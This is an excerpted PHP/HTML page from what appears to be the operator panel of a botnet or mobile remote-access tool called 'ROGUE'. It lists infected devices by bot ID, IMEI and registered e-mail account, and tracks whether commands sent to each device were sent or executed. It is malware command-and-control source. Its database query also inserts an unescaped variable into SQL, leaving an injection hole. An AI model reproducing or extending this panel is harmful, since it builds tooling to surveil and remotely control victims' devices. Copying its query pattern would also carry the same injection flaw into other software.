...
<head>
	<meta charset="UTF-8">
	 <meta http-equiv="refresh" content="4"; URL="status.php">
	...
	<main class="full-box main-container">
		...
		<section class="full-box page-content">
			...
			<div class="full-box page-header">
				<h3 class="text-left">
					<i class="fab fa-battle-net"></i>&nbsp; ROGUE
				</h3>
			...
			<div class="container-fluid">
				<ul class="full-box list-unstyled page-nav-tabs">
					<li>
					 <legend><i class="fab fa-magento"></i> &nbsp; Command Info</legend>
			...
			<div class="container-fluid">
				<form action="" class="form-neon" autocomplete="off">
                 ...
                 $query = "SELECT `clm_id`,`clm_device_id`,`clm_registered`,`clm_currentcommand`,`clm_commandseen`,`clm_device_name`,`clm_device_mail` FROM `tbl_device` WHERE clm_device_id=$content";
                 ...
                 if ($result = $mysqli->query($query)) {
                     while ($row = $result->fetch_assoc()) {
					   ...
					   $field4name = $row["clm_currentcommand"];
					   $field5name = $row["clm_commandseen"];
					    $field6name = $row["clm_device_name"];
					 $field7name = $row["clm_device_mail"];

						if ($field5name == "1") {
                         $field5name = "Executed !";
                   } else {
                         $field5name = "Command Sent!";
        ...
        echo '<tr> 
	          ...
	          <td><legend><i class="fab fa-mandalorian"></i> &nbsp; BOT ID  : '.$field1name.'</legend></td>
			 <td><legend><i class="fab fa-gitter"></i> &nbsp;  Device IMEI : '.$field2name.'</legend></td>
			  <td><legend><i class="fab fa-mailchimp"></i> &nbsp;  Registered Account : '.$field7name.'</legend></td>
			 <td><legend><i class="fab fa-staylinked"></i> &nbsp; Connected on : '.$field3name.'</legend></td>
	     	 <td><legend><i class="fab fa-rockrms"></i> &nbsp; Current Command : '.$field4name.'</legend></td>
			 <td><legend><i class="fab fa-phoenix-squadron"></i> &nbsp; Command Status : '.$field5name.'</legend></td>
